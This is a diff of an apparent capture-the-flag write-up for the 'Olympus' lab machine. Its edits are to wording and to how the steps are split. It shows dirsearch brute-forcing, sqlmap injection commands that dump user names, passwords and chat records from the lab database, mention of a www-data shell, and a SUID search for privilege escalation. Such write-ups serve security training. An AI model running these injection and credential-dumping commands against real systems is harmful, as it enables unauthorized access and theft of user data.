@@ -12,7 +12,7 @@ Output shows:
 
 Nmap shows that port 80 is trying to redirect to olympus.thm. To make the redirect work, let’s add the following to /etc/hosts:  10.10.105.247   olympus.thm
 
-Run directory brute force on port 80 with: dirsearch -r -u http://olympus.thm/ -e txt,php,html -f -w /usr/share/seclists/Discovery/Web-Content/common.txt\ 
+Run directory brute force on port 80 with: dirsearch -r -u http://olympus.thm/ -e txt,php,html -f -w /usr/share/seclists/Discovery/Web-Content/common.txt\
 Dirsearch found http://olympus.thm/~webmaster
 
 Navigating to directory /~webmaster shows:
@@ -38,7 +38,10 @@ Output shows:
 Table flag contains the first flag. To dump the flag use:\
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T flag --columns -C flag --dump
 
-Going back to the table names we extracted with sqlmap earlier.  We looked at table flag before, but there is another interesting table called users.  Dump the users information for username and password:\
+There is another interesting table called users.  Check the columns for the table 'users':\
+sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T users --columns
+
+Found columns user_name and user_password.  Dump the information to those 2 columns:\
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T users --columns -C user_name,user_password –dump
 
 ![image](https://user-images.githubusercontent.com/93153300/198897708-5a29bbfa-51d1-4d45-b7e3-8d4a4267d572.png)
@@ -63,7 +66,7 @@ On the left column, click on the Users → view all users.  It will show the fol
 
 ![image](https://user-images.githubusercontent.com/93153300/198897748-d878e9b2-9c9c-48a6-80a6-e54e1a5e9b96.png)
 
-Looking over the emails, it seems like chat.olumpus.thm could be a subdomain.  Add to /etc/hosts: 10.10.105.247  chat.olympus.thm\
+Looking over the emails, it seems like chat.olumpus.thm is a subdomain.  Add to /etc/hosts: 10.10.105.247  chat.olympus.thm\
 Navigating to that page redirects us to a directory /login, which is a login page:
 
 ![image](https://user-images.githubusercontent.com/93153300/198897755-6f535d59-f947-4a1f-8903-0fcd9fcd5d64.png)
@@ -81,12 +84,12 @@ sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob
 
 ![image](https://user-images.githubusercontent.com/93153300/198897790-1ddd3aff-ebc5-461b-9151-dea5a64c17e4.png)
  
-Our domain is chat.olympus.thm, so let’s look at table chats.\
+Our domain is chat.olympus.thm, so let’s look at table 'chats'.\
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T chats --columns
 
 ![image](https://user-images.githubusercontent.com/93153300/198897798-923a38ee-5d74-4599-a566-2cc98cfea6df.png)
  
-Column file is interesting, sounds like it should show us the files uploaded.\
+Column 'file' is interesting, sounds like it should show us the files uploaded.\
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --batch --data "search=blob&submit=" -p search --dbs -D olympus --tables -T chats --columns -C file –dump
 
 ![image](https://user-images.githubusercontent.com/93153300/198897805-83b7621f-af1e-4609-a6e7-73ba56fcca00.png)
@@ -99,7 +102,6 @@ It worked, we have a shell as www-data\
 Can get the user flag at /home/zeus/user.flag.
 ___________________________________________________
 **Lateral Movement:**\
-
 Check for suid:   find / -perm /4000 2>/dev/null\
 Found an interesting suid file owned by user zeus: 
 
